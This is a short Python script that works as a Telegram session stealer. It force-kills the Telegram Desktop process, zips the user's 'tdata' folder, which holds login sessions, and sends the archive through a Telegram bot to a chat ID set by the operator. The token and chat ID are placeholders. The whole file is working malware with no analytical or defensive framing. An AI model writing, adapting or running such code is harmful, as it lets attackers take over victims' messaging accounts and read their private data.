import zipfile
import getpass
import psutil
import os
import telebot

bot = telebot.TeleBot('YourToken')

def create_zip_archive(source_dir, zip_file):
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, source_dir))

def send_zip_archive(zip_file, chat_id):
    with open(zip_file, 'rb') as f:
        bot.send_document(chat_id, f)

def telegram():
    try:
        for process in (process for process in psutil.process_iter() if process.name() == "Telegram.exe"):
            process.kill()

        username = getpass.getuser()
        source_dir = fr'C:\Users\{username}\AppData\Roaming\Telegram Desktop\tdata'
        desktop_path = os.path.join(os.path.expanduser('~'), 'Temp')

        folders_zip = os.path.join(desktop_path, 'Folders.zip')
        create_zip_archive(source_dir, folders_zip)

        chat_id = 'CHAT_ID'
        send_zip_archive(folders_zip, chat_id)

    except Exception as e:
        print(f"Some error: {e}")

if __name__ == '__main__':
    telegram()
